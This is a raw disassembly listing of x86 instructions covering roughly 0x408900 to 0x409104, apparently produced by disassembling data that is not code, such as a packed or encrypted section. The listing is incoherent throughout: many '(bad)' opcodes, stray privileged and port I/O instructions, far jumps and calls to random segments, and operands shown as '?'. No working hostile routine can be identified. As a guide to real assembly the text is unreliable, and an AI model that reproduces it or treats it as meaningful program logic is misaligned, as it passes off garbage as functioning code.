  408900:	nop
  408901:	sbb    BYTE PTR [edx],cl
  408903:	cwde   
  408904:	aad    0xf7
  408906:	in     eax,0xa2
  408908:	pop    ebx
  408909:	adc    al,0xd0
  40890b:	mov    eax,ds:0x6ab3da18
  408910:	add    eax,0xfcb1e8eb
  408915:	mov    ecx,?
  408917:	jbe    0x408906
  408919:	push   edx
  40891a:	push   esi
  40891b:	sub    eax,0xa735d679
  408920:	jb     0x408983
  408922:	and    bh,dh
  408924:	(bad)  
  408926:	sbb    al,0x55
  408928:	popf   
  408929:	and    ah,BYTE PTR [ecx]
  40892b:	add    eax,0xa81e740
  408930:	stos   DWORD PTR es:[edi],eax
  408931:	mov    edi,0x659e0b22
  408936:	xchg   ebx,eax
  408937:	imul   edi,DWORD PTR [ecx+0x55],0xfb0ca74b
  40893e:	lods   al,BYTE PTR ds:[esi]
  40893f:	dec    edi
  408940:	enter  0xa507,0x58
  408944:	dec    esi
  408945:	mov    ebp,0x8694963c
  40894a:	mov    ebp,0x735cbb1
  40894f:	adc    ah,ch
  408951:	sbb    bh,BYTE PTR [ecx+edi*2+0x306c1d7a]
  408958:	ins    BYTE PTR es:[edi],dx
  408959:	xor    DWORD PTR [edi+0x3c],edx
  40895c:	ja     0x4089db
  40895e:	mov    dh,bh
  408960:	int3   
  408961:	dec    esp
  408962:	repnz add BYTE PTR [edi-0x7f],dl
  408966:	(bad)  
  408967:	jnp    0x408956
  408969:	mov    esp,0x96249d74
  40896e:	fld    QWORD PTR [edx]
  408970:	inc    edi
  408971:	xchg   BYTE PTR [edx],al
  408973:	sub    edi,DWORD PTR [ebp+0x43803cd2]
  408979:	add    BYTE PTR [ecx],ah
  40897b:	inc    ebx
  40897c:	pusha  
  40897d:	repz push ecx
  40897f:	cmp    DWORD PTR [edi+0x5eaa4315],ebx
  408985:	adc    al,0x86
  408987:	rcl    DWORD PTR [edx+0x24],0xae
  40898b:	js     0x4089a0
  40898d:	jge    0x408a09
  40898f:	rol    BYTE PTR ds:0xc9c65f72,cl
  408995:	aam    0x59
  408997:	cwde   
  408998:	fcomp  QWORD PTR [edi-0xf]
  40899b:	dec    edx
  40899c:	fsubr  DWORD PTR [esp+esi*8+0x40]
  4089a0:	and    bh,bl
  4089a2:	out    dx,al
  4089a3:	jo     0x4089c0
  4089a5:	fild   WORD PTR [ecx]
  4089a7:	int3   
  4089a8:	push   esi
  4089a9:	jb     0x4089b5
  4089ab:	in     eax,dx
  4089ac:	lahf   
  4089ad:	and    eax,0xa3f087bf
  4089b2:	lea    ebp,[eax-0x53a7f9ea]
  4089b8:	push   eax
  4089b9:	icebp  
  4089ba:	sbb    al,0xc3
  4089bc:	sbb    BYTE PTR [ecx],cl
  4089be:	mov    eax,0xad558564
  4089c3:	inc    eax
  4089c4:	mov    ah,0xf
  4089c6:	mov    ebx,0x4fee4913
  4089cb:	call   0xb42b6552
  4089d0:	or     eax,0x541802cd
  4089d5:	mov    ds:0xe3418066,eax
  4089da:	dec    esi
  4089db:	or     BYTE PTR [esi],ch
  4089dd:	(bad)
  4089e0:	push   0xc9ac617f
  4089e5:	and    ebp,DWORD PTR [esp+edx*8]
  4089e8:	cmp    ebx,edi
  4089ea:	and    cl,BYTE PTR [eax]
  4089ec:	das    
  4089ed:	inc    esi
  4089ee:	mov    ecx,0x544cd5e9
  4089f3:	inc    edx
  4089f4:	or     ch,BYTE PTR [edi-0x384bf9b8]
  4089fa:	and    esp,DWORD PTR [esi+eiz*8]
  4089fd:	aaa    
  4089fe:	leave  
  4089ff:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408a00:	dec    ebp
  408a01:	jne    0x4089ec
  408a03:	xor    esi,DWORD PTR [ecx]
  408a05:	lds    ebp,FWORD PTR [edi]
  408a07:	pop    ds
  408a08:	pop    ss
  408a09:	loope  0x408a4b
  408a0b:	push   ecx
  408a0c:	jp     0x408a50
  408a0e:	sbb    DWORD PTR [esi],0xfd9564ab
  408a14:	pop    eax
  408a15:	add    eax,0x736a9e8d
  408a1a:	dec    ebp
  408a1b:	pop    edi
  408a1c:	mov    cs,WORD PTR [ecx+edi*1+0x0]
  408a20:	cwde   
  408a21:	cwde   
  408a22:	add    dl,BYTE PTR [edi]
  408a24:	cwde   
  408a25:	mov    ds:0xfa8fe926,al
  408a2a:	mov    ?,WORD PTR [eax+0x4b4ffd85]
  408a30:	mov    ebx,0x6bbc288b
  408a35:	rcl    DWORD PTR [ecx+ecx*1-0x6dccd94b],0x38
  408a3d:	dec    esp
  408a3e:	out    0xb4,al
  408a40:	adc    sp,WORD PTR [eax]
  408a43:	push   cs
  408a44:	push   ebp
  408a45:	sub    BYTE PTR [ebp-0x5480c714],ah
  408a4b:	test   al,0xf2
  408a4d:	pop    ebp
  408a4e:	int    0xb3
  408a50:	in     eax,0x5
  408a52:	push   ebx
  408a53:	scas   eax,DWORD PTR es:[edi]
  408a54:	test   eax,0x477bd920
  408a59:	add    al,BYTE PTR ds:0x55074a01
  408a5f:	jno    0x408a3a
  408a61:	push   ebp
  408a62:	mov    ebx,edi
  408a64:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408a65:	popa   
  408a66:	test   al,0x3d
  408a68:	add    DWORD PTR [eax-0x441ebff5],esi
  408a6e:	arpl   WORD PTR [bx],bp
  408a71:	cmp    esp,DWORD PTR [edi+ecx*4]
  408a74:	test   al,0x1f
  408a76:	ss cmp al,0xff
  408a79:	test   DWORD PTR [ebx+0x69],0xb8199430
  408a80:	sub    eax,DWORD PTR [edx+0x4d74b821]
  408a86:	add    al,0x99
  408a88:	loop   0x408ad8
  408a8a:	xor    DWORD PTR [esi],edi
  408a8c:	into   
  408a8d:	jbe    0x408a70
  408a8f:	xchg   ebx,eax
  408a90:	imul   ecx,esp,0x15
  408a93:	xor    eax,0xf5bf326b
  408a98:	cmp    BYTE PTR [edi+eiz*2],bl
  408a9b:	xchg   ebx,eax
  408a9c:	test   eax,0xeaeb2999
  408aa1:	mov    edx,0xf22caa40
  408aa6:	add    eax,0xd260c484
  408aab:	jno    0x408b20
  408aad:	cmp    DWORD PTR [eax+0x44],ebx
  408ab0:	adc    eax,DWORD PTR [edi+0x3fe6275f]
  408ab6:	dec    ecx
  408ab7:	loopne 0x408b03
  408ab9:	add    DWORD PTR [edx-0x14cc9787],ebx
  408abf:	add    eax,0x49118f7d
  408ac4:	inc    edi
  408ac5:	mov    ss,WORD PTR [ecx]
  408ac7:	sub    BYTE PTR [esi+0x72ef6c38],bh
  408acd:	inc    edi
  408ace:	xor    cl,dl
  408ad0:	xchg   BYTE PTR [ecx],al
  408ad2:	pop    edi
  408ad3:	dec    edi
  408ad4:	neg    ah
  408ad6:	lods   eax,DWORD PTR fs:[esi]
  408ad8:	shr    edx,1
  408ada:	adc    al,0x6d
  408adc:	jo     0x408b19
  408ade:	mov    BYTE PTR [edi],0xf
  408ae1:	xchg   ebx,eax
  408ae2:	adc    al,BYTE PTR [ecx-0x4ea5a29]
  408ae8:	clc    
  408ae9:	jns    0x408a7c
  408aeb:	cdq    
  408aec:	jo     0x408b4c
  408aee:	imul   ebx,edi,0x73
  408af1:	fdiv   DWORD PTR [ebp-0x50]
  408af4:	loope  0x408b35
  408af6:	into   
  408af7:	call   DWORD PTR [edx-0x3eaee251]
  408afd:	das    
  408afe:	arpl   WORD PTR [ebx],si
  408b00:	adc    BYTE PTR [edi],dl
  408b02:	push   esi
  408b03:	or     eax,0x7421e13
  408b08:	in     eax,dx
  408b09:	data16 cmc 
  408b0b:	mov    BYTE PTR [edx+0x16466d95],dl
  408b11:	loopne 0x408ac9
  408b13:	push   esp
  408b14:	pop    esp
  408b15:	inc    ecx
  408b16:	sbb    al,0x99
  408b18:	adc    BYTE PTR [esi-0x12],ah
  408b1b:	push   esi
  408b1c:	pusha  
  408b1d:	jl     0x408b62
  408b1f:	(bad)  
  408b21:	jnp    0x408b79
  408b23:	int    0x46
  408b25:	int3   
  408b26:	add    BYTE PTR [ebp+edi*2+0x799eb34a],0xb7
  408b2e:	add    al,0x10
  408b30:	xor    BYTE PTR [edi-0x2a58808],bh
  408b36:	div    DWORD PTR [ebx+0x89879ac]
  408b3c:	pop    ebx
  408b3d:	ins    DWORD PTR es:[edi],dx
  408b3e:	imul   eax,DWORD PTR [edx-0x1d60a44d],0xffffff8e
  408b45:	cmp    al,BYTE PTR [esi-0x62a3bc3e]
  408b4b:	ret    0x829e
  408b4e:	rol    dl,cl
  408b50:	out    dx,al
  408b51:	xor    al,dh
  408b53:	sbb    ebp,DWORD PTR [edx+ecx*8+0x3d5fe4e9]
  408b5a:	ret    
  408b5b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408b5c:	sub    eax,0xf1ea6938
  408b61:	jg     0x408b2f
  408b63:	xchg   ecx,eax
  408b64:	mov    ah,BYTE PTR [esi+0x9]
  408b67:	push   ss
  408b68:	mov    DWORD PTR [ecx],ebp
  408b6a:	inc    edx
  408b6b:	loopne 0x408b8e
  408b6d:	inc    ecx
  408b6e:	and    ebx,eax
  408b70:	pop    ds
  408b71:	mov    esi,0xed46a3ab
  408b76:	call   0xbfbfbb45
  408b7b:	and    edx,edi
  408b7d:	ss icebp 
  408b7f:	or     esi,edi
  408b81:	xor    BYTE PTR [edx-0x78109078],ch
  408b87:	sub    DWORD PTR [edi],0x75937c4d
  408b8d:	xchg   edi,eax
  408b8e:	or     al,0xfe
  408b90:	std    
  408b91:	sar    BYTE PTR [eax+0x20],cl
  408b94:	inc    esp
  408b95:	jnp    0x408b63
  408b97:	fisub  DWORD PTR [eax+ebx*4-0x46]
  408b9b:	stos   DWORD PTR es:[edi],eax
  408b9c:	jbe    0x408b6d
  408b9e:	int    0x67
  408ba0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408ba1:	popf   
  408ba2:	xchg   BYTE PTR [eax-0x539bc32e],ch
  408ba8:	rol    DWORD PTR [ebx],1
  408baa:	pop    ebx
  408bab:	jne    0x408c12
  408bad:	and    al,0x52
  408baf:	xchg   esp,eax
  408bb0:	mov    al,ds:0x4c201966
  408bb5:	add    edx,DWORD PTR [esi]
  408bb7:	aam    0xa3
  408bb9:	ror    DWORD PTR [esi-0x2e8efaf0],0x42
  408bc0:	and    BYTE PTR [edi],bl
  408bc2:	inc    eax
  408bc3:	push   esp
  408bc4:	retf   
  408bc5:	pop    ds
  408bc6:	in     al,0x20
  408bc8:	mov    dl,0x1
  408bca:	cmc    
  408bcb:	mov    edx,0x6119b912
  408bd0:	mov    esi,0x7a1351d8
  408bd5:	sbb    eax,0x5b9c372
  408bda:	dec    ebx
  408bdb:	xchg   edx,eax
  408bdc:	push   edi
  408bdd:	stos   DWORD PTR es:[edi],eax
  408bde:	lahf   
  408bdf:	pop    edi
  408be0:	push   edx
  408be1:	jmp    0x520e5947
  408be6:	gs and dh,bh
  408be9:	pop    ecx
  408bea:	mov    ebx,0x689c3508
  408bef:	mov    ebx,0xf0902d35
  408bf4:	enter  0x98c1,0xac
  408bf8:	fucom  st(2)
  408bfa:	int3   
  408bfb:	ins    DWORD PTR es:[edi],dx
  408bfc:	push   esi
  408bfd:	imul   edi,DWORD PTR [ebp+0x224cfe44],0xeaab1a01
  408c07:	xor    ebx,esi
  408c09:	adc    BYTE PTR [eax+0x6a1b2d02],dl
  408c0f:	bound  ebp,QWORD PTR [ebx]
  408c11:	xchg   ebp,eax
  408c12:	daa    
  408c13:	push   cs
  408c14:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408c15:	imul   eax,DWORD PTR [edx-0x7c],0x961b7710
  408c1c:	mov    esi,0xa767dd6f
  408c21:	stos   BYTE PTR es:[edi],al
  408c22:	enter  0x1118,0x3b
  408c26:	mov    ds:0x355e6ece,al
  408c2b:	adc    eax,0x8f914e6c
  408c30:	mov    eax,ds:0xbe93f614
  408c35:	test   al,0xa
  408c37:	push   cs
  408c38:	dec    ebp
  408c39:	rcr    BYTE PTR [ebx],0xff
  408c3c:	dec    eax
  408c3d:	ds push esi
  408c3f:	pop    es
  408c40:	dec    ebp
  408c41:	jae    0x408ca0
  408c43:	inc    esp
  408c44:	dec    edx
  408c45:	rol    DWORD PTR [ebx],0x95
  408c48:	stos   BYTE PTR es:[edi],al
  408c49:	(bad)  
  408c4a:	xor    al,0xe3
  408c4c:	fcmovbe st,st(3)
  408c4e:	int    0xd6
  408c50:	ss jne 0x408c6d
  408c53:	out    dx,al
  408c54:	jbe    0x408c3f
  408c56:	xchg   esp,eax
  408c57:	pop    esp
  408c58:	push   ebp
  408c59:	pop    ss
  408c5a:	pmullw mm1,mm4
  408c5d:	sbb    BYTE PTR [edi+0x1c5a2df9],dl
  408c63:	xchg   esi,eax
  408c64:	mov    bl,0x35
  408c66:	cmp    ecx,esp
  408c68:	loop   0x408c48
  408c6a:	mov    DWORD PTR [ecx-0x79],edx
  408c6d:	ins    BYTE PTR es:[edi],dx
  408c6e:	lods   eax,DWORD PTR ds:[esi]
  408c6f:	lds    esi,FWORD PTR [eax-0x2792f863]
  408c75:	mov    al,0xdb
  408c77:	call   0xf646:0xa082fcb
  408c7e:	test   al,0xbd
  408c80:	clc    
  408c81:	mov    ah,0xa7
  408c83:	mov    dl,0x75
  408c85:	je     0x408c96
  408c87:	fidiv  DWORD PTR [ecx+0x46b59dfa]
  408c8d:	adc    DWORD PTR [ecx+0x15e8ac36],ebx
  408c93:	pop    esp
  408c94:	push   0x638eb439
  408c99:	push   0xffffffe7
  408c9b:	pop    ebp
  408c9c:	js     0x408c20
  408c9e:	out    0x11,eax
  408ca0:	xchg   ecx,eax
  408ca1:	sub    al,0x48
  408ca3:	mov    edi,0xe892539e
  408ca8:	push   eax
  408ca9:	fstp   QWORD PTR ds:0x1e3a8cf1
  408caf:	into   
  408cb0:	sbb    DWORD PTR [ecx-0x48],esi
  408cb3:	lahf   
  408cb4:	jle    0x408c99
  408cb6:	fcmovnb st,st(3)
  408cb8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408cb9:	mov    ch,0x30
  408cbb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408cbc:	retf   0xe16f
  408cbf:	je     0x408c5f
  408cc1:	aam    0x6
  408cc3:	mov    eax,0xec2c3760
  408cc8:	mov    ch,bh
  408cca:	xor    al,0x13
  408ccd:	les    edx,FWORD PTR [ebp+ebp*4+0xa]
  408cd1:	add    eax,0x925d24fe
  408cd6:	xor    DWORD PTR [esi+0x2a],eax
  408cd9:	and    eax,0x116e2347
  408cde:	mov    ds:0x44226de6,eax
  408ce3:	jmp    0x9fc3:0x882a9b39
  408cea:	pandn  mm5,QWORD PTR [eax+0x496c12a2]
  408cf1:	stos   DWORD PTR es:[edi],eax
  408cf2:	dec    esp
  408cf3:	imul   esi,DWORD PTR [edi+0x32],0x79dff75b
  408cfa:	inc    ecx
  408cfb:	retf   
  408cfc:	lods   eax,DWORD PTR ds:[esi]
  408cfd:	jo     0x408cf1
  408cff:	jmp    0xe11:0x19287f9e
  408d06:	rcr    BYTE PTR [esi+0x2d383324],0x81
  408d0d:	(bad)  
  408d0e:	fidivr WORD PTR [eax]
  408d10:	mov    esi,0x1f68e4e2
  408d15:	cmp    esi,edi
  408d17:	push   es
  408d18:	pop    edi
  408d19:	je     0x408d53
  408d1b:	xlat   BYTE PTR ds:[ebx]
  408d1c:	add    DWORD PTR [edx],esp
  408d1e:	mov    ds:0x70eac4f8,eax
  408d23:	xchg   DWORD PTR [esi],esp
  408d25:	sbb    bh,BYTE PTR [ebx-0x49235f18]
  408d2b:	std    
  408d2c:	(bad)  
  408d2d:	xchg   edi,eax
  408d2e:	icebp  
  408d2f:	jns    0x408da1
  408d31:	xor    al,0xc9
  408d33:	mov    al,ds:0x5642f54c
  408d38:	adc    esp,DWORD PTR [edi]
  408d3a:	mov    ebp,DWORD PTR [ecx+0x2b0ccc1b]
  408d40:	cmp    DWORD PTR ds:0x37de734f,edx
  408d46:	bound  ecx,QWORD PTR [ebx+0x25]
  408d49:	(bad)  
  408d4a:	bound  edi,QWORD PTR [edx+ecx*2-0x29]
  408d4e:	mov    dl,0x66
  408d50:	sub    dl,dh
  408d52:	xchg   ebp,eax
  408d53:	push   edi
  408d54:	loop   0x408dbd
  408d56:	inc    esp
  408d57:	test   DWORD PTR [edi+0x71],ebp
  408d5a:	push   edi
  408d5b:	mov    bl,0x15
  408d5d:	dec    ebx
  408d5e:	and    eax,0x9a66f44a
  408d63:	add    bl,BYTE PTR [edi-0x45]
  408d66:	sbb    BYTE PTR [ecx-0x7adf250f],0x81
  408d6d:	lea    edx,[eax]
  408d6f:	xchg   ecx,eax
  408d70:	adc    eax,0x2760887d
  408d75:	or     BYTE PTR [edi-0x49927eb2],ah
  408d7b:	sub    al,0xa6
  408d7d:	pop    es
  408d7e:	test   ebx,ebx
  408d80:	xor    dl,BYTE PTR [edi]
  408d82:	mov    ch,0x7d
  408d84:	jmp    0x408de5
  408d86:	je     0x408d0e
  408d88:	lahf   
  408d89:	inc    ecx
  408d8a:	pop    es
  408d8b:	jl     0x408e02
  408d8d:	data16 ficom DWORD PTR [eax-0x50]
  408d91:	out    0x66,eax
  408d93:	jl     0x408de3
  408d95:	addr16 in al,dx
  408d97:	cmp    DWORD PTR [ecx-0x1c],edi
  408d9a:	pop    esp
  408d9b:	test   eax,0x824518d6
  408da0:	cs shr ch,0xa6
  408da4:	mov    bl,0x4c
  408da6:	dec    ebp
  408da7:	xchg   DWORD PTR [ebx],edi
  408da9:	or     esi,esp
  408dab:	dec    ebx
  408dac:	dec    ebx
  408dad:	je     0x408de3
  408daf:	inc    eax
  408db0:	repnz cli 
  408db2:	xchg   BYTE PTR [ebx-0x44],ch
  408db5:	es mov ebp,0x7701c95d
  408dbb:	inc    esi
  408dbc:	jmp    0xaec53654
  408dc1:	not    BYTE PTR ds:0x3f1c17fe
  408dc7:	jge    0x408db3
  408dc9:	cwde   
  408dca:	push   edi
  408dcb:	push   eax
  408dcc:	pushf  
  408dcd:	xchg   edi,eax
  408dce:	xor    ah,BYTE PTR [esi+0x3bf7aea0]
  408dd4:	adc    bh,ch
  408dd6:	retf   0x6868
  408dd9:	gs mov bh,0xd0
  408ddc:	xchg   ebp,eax
  408ddd:	mov    WORD PTR [ecx+0x7f23d517],ss
  408de3:	pop    ss
  408de4:	nop
  408de5:	mov    ch,0x0
  408de7:	and    eax,0x8689e212
  408dec:	dec    ebx
  408ded:	adc    al,0xa0
  408def:	ins    BYTE PTR es:[edi],dx
  408df0:	mov    al,BYTE PTR [edi+0x51278382]
  408df6:	mov    cs,ecx
  408df8:	xchg   edi,eax
  408df9:	pushf  
  408dfa:	jb     0xde38ecd
  408e00:	pop    ecx
  408e01:	call   0x3de4081
  408e06:	aas    
  408e07:	mov    ds:0x7a4b199a,al
  408e0c:	rcl    DWORD PTR [ebx],cl
  408e0e:	mov    al,ds:0x5524dd2e
  408e13:	mov    edx,0xf2faab4b
  408e18:	call   0x85037e40
  408e1d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408e1e:	xchg   ebp,eax
  408e1f:	pop    ds
  408e20:	mov    ebx,DWORD PTR [eax+0x3689d5eb]
  408e26:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408e27:	adc    al,0x6c
  408e29:	add    bl,BYTE PTR [ebx]
  408e2b:	mov    dh,0xd7
  408e2d:	mov    edi,esp
  408e2f:	pop    ds
  408e30:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408e31:	xor    al,0xdc
  408e33:	idiv   BYTE PTR [edi]
  408e35:	sub    dh,ah
  408e37:	pop    ebx
  408e38:	stc    
  408e39:	add    BYTE PTR [ecx-0x7809df6e],dl
  408e3f:	mov    eax,ds:0x84a3e2a3
  408e44:	shl    bh,0x15
  408e47:	sub    ecx,esp
  408e49:	mov    ebp,0xdcbc7a69
  408e4e:	sbb    BYTE PTR [ebx+0x18],dl
  408e51:	xchg   ebx,esp
  408e53:	in     al,0x55
  408e55:	imul   esi
  408e57:	call   0xf343:0x3603ea70
  408e5e:	sub    eax,0x631bf21d
  408e63:	xchg   edi,eax
  408e64:	mov    bh,0x43
  408e66:	ins    DWORD PTR es:[edi],dx
  408e67:	scas   al,BYTE PTR es:[edi]
  408e68:	inc    esi
  408e69:	inc    ecx
  408e6a:	mov    esp,0x60c11b65
  408e6f:	push   0xf8045250
  408e74:	jl     0x408ee6
  408e76:	out    0x58,al
  408e78:	enter  0x255c,0x19
  408e7c:	out    0x88,eax
  408e7e:	mov    dl,0x3
  408e80:	push   edi
  408e81:	jmp    0xc967:0xd5c33085
  408e88:	retf   0xe623
  408e8b:	js     0x408ea6
  408e8d:	add    ah,BYTE PTR ds:0x81eb7d1
  408e93:	push   edx
  408e94:	leave  
  408e95:	jmp    0xa710:0x69a97ef9
  408e9c:	and    esi,DWORD PTR [esi-0x6c9756c4]
  408ea2:	xchg   BYTE PTR [edx+0x6dd124db],dh
  408ea8:	push   0xffffff9f
  408eaa:	pop    esi
  408eab:	aas    
  408eac:	adc    BYTE PTR [edi-0x15],0xfe
  408eb0:	ror    BYTE PTR [edi+eax*1+0x4b],0x2e
  408eb5:	ss jbe 0x408ee7
  408eb8:	scas   al,BYTE PTR es:[edi]
  408eb9:	inc    edx
  408eba:	jecxz  0x408eae
  408ebc:	dec    ebp
  408ebd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408ebe:	test   BYTE PTR [edx+0x5f],0x78
  408ec2:	ret    
  408ec3:	inc    edx
  408ec4:	fcomp  DWORD PTR [edi]
  408ec6:	jl     0x408ebc
  408ec8:	xor    esp,DWORD PTR [ebx-0x7da6e63b]
  408ece:	sbb    al,0x95
  408ed0:	or     eax,0x3895710a
  408ed6:	cmp    edx,DWORD PTR [ecx+0x22cea3ef]
  408edc:	imul   ebp,esp,0x428cdef1
  408ee2:	test   eax,0x4679cc13
  408ee7:	nop
  408ee8:	sbb    al,0xb4
  408eea:	or     eax,DWORD PTR [eax+eax*2+0x260ae0ff]
  408ef1:	ret    0xdec6
  408ef4:	and    eax,0xe467cf2e
  408ef9:	mov    edx,DWORD PTR [edi+0x71]
  408efc:	dec    esp
  408efd:	push   es
  408efe:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408eff:	cmp    DWORD PTR [eax+0x4d],esp
  408f02:	test   eax,0x25a97019
  408f07:	sub    cl,ch
  408f09:	dec    eax
  408f0a:	dec    edx
  408f0b:	inc    edi
  408f0c:	and    esp,0x5a
  408f0f:	cmp    eax,0x5c2f1b17
  408f14:	and    dl,al
  408f16:	sti    
  408f17:	adc    al,0x67
  408f19:	leave  
  408f1a:	out    0xc9,eax
  408f1c:	jg     0x408ef1
  408f1e:	inc    esi
  408f1f:	add    al,0x65
  408f21:	push   0x773a40c2
  408f26:	push   ecx
  408f27:	(bad)  
  408f28:	repz xchg edi,eax
  408f2a:	sub    eax,0xe1862285
  408f2f:	mov    esi,0xd2f5ca30
  408f34:	loope  0x408f59
  408f36:	mov    edi,0xfb244c13
  408f3b:	add    ch,ch
  408f3d:	push   esp
  408f3e:	pop    esi
  408f3f:	add    esi,edx
  408f41:	cmp    ah,0x85
  408f44:	cmp    BYTE PTR [esi+0x3d],ch
  408f47:	inc    esi
  408f48:	pop    eax
  408f49:	fst    QWORD PTR [esp+ecx*4+0x77]
  408f4d:	or     ebx,DWORD PTR [esi+0x77be331b]
  408f53:	xlat   BYTE PTR ds:[ebx]
  408f54:	(bad)  
  408f57:	xor    BYTE PTR [eax+0x13702805],0x8b
  408f5e:	push   edi
  408f5f:	(bad)  
  408f60:	and    bl,BYTE PTR [ebx+0xf0fcf59]
  408f66:	xchg   bh,dl
  408f68:	xor    BYTE PTR [edx+0x32802424],dh
  408f6e:	pop    eax
  408f6f:	pop    edi
  408f70:	xor    dl,BYTE PTR [edi-0x6f]
  408f73:	mov    al,0x0
  408f75:	adc    edx,DWORD PTR [ebx]
  408f77:	push   es
  408f78:	add    edi,edi
  408f7a:	cdq    
  408f7b:	sbb    ecx,DWORD PTR [esi-0x33891b4]
  408f81:	imul   ecx,DWORD PTR [ebx-0x5f],0x5e
  408f85:	popf   
  408f86:	enter  0xc44d,0x21
  408f8a:	test   eax,0x71159c3b
  408f8f:	ffree  st(2)
  408f91:	mov    cl,0x0
  408f93:	fdiv   QWORD PTR [ebx+0x1f0a00ed]
  408f99:	sbb    ebx,ebx
  408f9b:	pop    es
  408f9c:	in     al,0xcb
  408f9e:	jae    0x408f68
  408fa0:	mov    ah,0x77
  408fa2:	push   cs
  408fa3:	push   ss
  408fa4:	xchg   DWORD PTR [eax+0x610dcfb6],edi
  408faa:	adc    eax,DWORD PTR [eax]
  408fac:	clc    
  408fad:	gs xchg esp,eax
  408faf:	xchg   esi,eax
  408fb0:	mov    dh,0xf1
  408fb2:	jb     0x408fb0
  408fb4:	mov    cl,0x19
  408fb6:	minps  xmm0,XMMWORD PTR [edx-0x64]
  408fba:	push   edi
  408fbb:	push   ss
  408fbc:	mov    DWORD PTR [edx],eax
  408fbe:	(bad)  
  408fbf:	aam    0x22
  408fc1:	dec    edi
  408fc2:	xor    eax,0xb4a95db2
  408fc7:	mov    ds:0x63a2c088,eax
  408fcc:	sub    ebp,eax
  408fce:	(bad)  
  408fcf:	icebp  
  408fd0:	fld    DWORD PTR [ebx+eiz*2+0x348e58fe]
  408fd7:	(bad)  
  408fd8:	shr    DWORD PTR [ebp-0x12a3724d],1
  408fde:	push   ebx
  408fdf:	pop    es
  408fe0:	adc    ecx,DWORD PTR [esi+edx*2+0x70]
  408fe4:	jl     0x409059
  408fe6:	and    DWORD PTR [ebx+0x4cb607e1],0xbde9cf2d
  408ff0:	adc    DWORD PTR [esp+ebp*4],eax
  408ff3:	mov    esp,0x620f38e
  408ff8:	push   edx
  408ff9:	add    ah,bl
  408ffb:	adc    al,0xfc
  408ffd:	inc    edx
  408ffe:	push   ebp
  408fff:	add    DWORD PTR [ecx+0x56],eax
  409002:	mov    ecx,0x725db6df
  409007:	mov    eax,0xe0b4491f
  40900c:	leave  
  40900d:	cmp    bl,BYTE PTR [eax+0x61f175c8]
  409013:	call   DWORD PTR [ebx]
  409015:	xchg   esp,eax
  409016:	mov    dl,0x6d
  409018:	call   0x106f:0x6fd1b1
  40901f:	xor    DWORD PTR ds:0x26263511,ebp
  409025:	dec    edi
  409026:	repnz add bl,bl
  409029:	daa    
  40902a:	adc    edx,ebx
  40902c:	cmp    eax,0x8763fdeb
  409031:	ja     0x40906e
  409033:	jno    0x409015
  409035:	call   0x92525e76
  40903a:	push   ss
  40903b:	call   0xe5b3:0x42683114
  409042:	int3   
  409043:	sbb    esi,esi
  409045:	xchg   ebp,eax
  409046:	hlt    
  409047:	cmp    eax,edi
  409049:	pop    ebp
  40904a:	rol    BYTE PTR [ecx+0x5cbc43e2],1
  409050:	popa   
  409051:	inc    edx
  409052:	mov    ds:0x1bc4adb4,eax
  409057:	adc    BYTE PTR [esi+0x16],bh
  40905a:	jb     0x409099
  40905c:	mov    fs:0xe06cc6b1,al
  409062:	mov    bl,0xeb
  409064:	mov    bh,0x2
  409066:	not    DWORD PTR [edx+ebp*2+0x26]
  40906a:	push   ebp
  40906b:	rcr    BYTE PTR [esi],1
  40906d:	gs ins BYTE PTR es:[edi],dx
  40906f:	cld    
  409070:	pop    es
  409071:	scas   eax,DWORD PTR es:[edi]
  409072:	or     edx,DWORD PTR [edx+0x5]
  409075:	(bad)
  409078:	push   0x7eda70ee
  40907d:	pop    es
  40907e:	mov    ?,edx
  409080:	pop    ss
  409081:	pop    eax
  409082:	das    
  409083:	push   es
  409084:	int3   
  409085:	add    al,0x80
  409087:	mov    gs,WORD PTR [eax+ebx*2+0x1d0b668c]
  40908e:	mov    esi,ebx
  409090:	or     BYTE PTR [esi+0x7f2d96b6],cl
  409096:	lods   eax,DWORD PTR ds:[esi]
  409097:	lds    ecx,FWORD PTR [edi]
  409099:	aaa    
  40909a:	dec    DWORD PTR [eax+esi*2+0x43]
  40909e:	jnp    0x40903c
  4090a0:	mov    ah,0xed
  4090a2:	jne    0x409106
  4090a4:	std    
  4090a5:	loopne 0x409094
  4090a7:	es retf 
  4090a9:	fucomp st(0)
  4090ab:	ror    DWORD PTR cs:[edi+0x47252fb7],cl
  4090b2:	sahf   
  4090b3:	or     dl,BYTE PTR [ebp-0x2d]
  4090b6:	or     BYTE PTR [esi-0x1b23a0ce],0x24
  4090bd:	dec    edx
  4090be:	add    DWORD PTR [edi+0x63],edx
  4090c1:	cdq    
  4090c2:	jge    0x4090a1
  4090c4:	sbb    eax,0x86ee3cd
  4090c9:	push   esi
  4090ca:	xchg   edi,eax
  4090cb:	(bad)  
  4090cc:	js     0x409100
  4090ce:	fld1   
  4090d0:	cli    
  4090d1:	into   
  4090d2:	jmp    0x4090d1
  4090d4:	pop    esp
  4090d5:	jecxz  0x4090a4
  4090d7:	jnp    0x4090f9
  4090d9:	jne    0x409069
  4090db:	xlat   BYTE PTR ds:[ebx]
  4090dc:	ret    
  4090dd:	loope  0x40911d
  4090df:	data16 cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4090e1:	loop   0x409076
  4090e3:	or     eax,0x69f27285
  4090e8:	push   edi
  4090e9:	loope  0x409129
  4090eb:	nop
  4090ec:	mov    bh,0xa3
  4090ee:	xor    ecx,esi
  4090f0:	push   esp
  4090f1:	jb     0x40913b
  4090f3:	mov    ds:0xbcb794d1,eax
  4090f8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4090f9:	mov    ds:0x990d12b3,eax
  4090fe:	push   es
  4090ff:	rcl    DWORD PTR [edx+0x66],0xce
  409103:	xchg   esi,eax
  409104:	pop    esi
